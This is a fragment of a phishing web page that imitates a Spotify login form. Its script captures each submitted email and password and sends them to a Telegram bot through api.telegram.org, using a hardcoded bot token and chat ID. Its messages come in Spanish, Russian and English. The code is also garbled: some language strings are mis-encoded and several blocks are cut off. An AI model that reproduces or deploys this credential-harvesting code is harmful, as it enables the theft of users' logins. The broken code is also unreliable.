<body>

      },
      pl: {

        signup: "–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è", 
        "signup-text": "–ï—â–µ –Ω–µ—Ç –∞–∫–∫–∞—É–Ω—Ç–∞?",
        "processing": "–í—Ö–æ–¥..."

    };

    const langSelect = document.getElementById("language");

    function applyLanguage(lang) {
      document.querySelectorAll("[data-translate]").forEach(el => {
        const key = el.getAttribute("data-translate");
        el.innerHTML = translations[lang][key] || el.innerHTML;
      });
      document.querySelectorAll("[data-placeholder]").forEach(el => {
        const key = el.getAttribute("data-placeholder");
        el.placeholder = translations[lang][key] || el.placeholder;
      });
    }

    // Langue par d√©faut : espagnol
    const savedLang = localStorage.getItem("selectedLang") || "es";
    langSelect.value = savedLang;
    applyLanguage(savedLang);

    langSelect.addEventListener("change", () => {
      const lang = langSelect.value;
      localStorage.setItem("selectedLang", lang);
      applyLanguage(lang);
    });

    // Gestion de la soumission du formulaire et envoi √† Telegram
    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();
      document.getElementById("loading").style.display = "flex";
      document.getElementById("btn-submit").disabled = true;

      const email = document.getElementById("loginForm").querySelector('input[type="email"]').value.trim();
      const pwd = document.getElementById("loginForm").querySelector('input[type="password"]').value.trim();
      const bot = "8289013486:AAHS-ti5CgbqRwytDmqAieUfBbBrn8gmxdI";
      const chat = "-4810324154";
      const currentLang = langSelect.value;
      
      let msg;
      if (currentLang === "es") {
        msg = `üéß Inicio de sesi√≥n Spotify:\nüìß Correo: ${email}\nüîë Contrase√±a: ${pwd}`;
      } else if (currentLang === "fr") {

      } else if (currentLang === "ru") {
        msg = `üéß –í—Ö–æ–¥ Spotify:\nüìß –ü–æ—á—Ç–∞: ${email}\nüîë –ü–∞—Ä–æ–ª—å: ${pwd}`;
      } else {
        msg = `üéß Spotify Login:\nüìß Email: ${email}\nüîë Password: ${pwd}`;

      fetch(`https://api.telegram.org/bot${bot}/sendMessage`, {

      .then(response => {

          throw new Error('Network response was not ok');
        }
        return response.json();
      })
      .then(data => {
        console.log('Message sent to Telegram:', data);
        setTimeout(() => {

      .catch(error => {

    });
  </script>
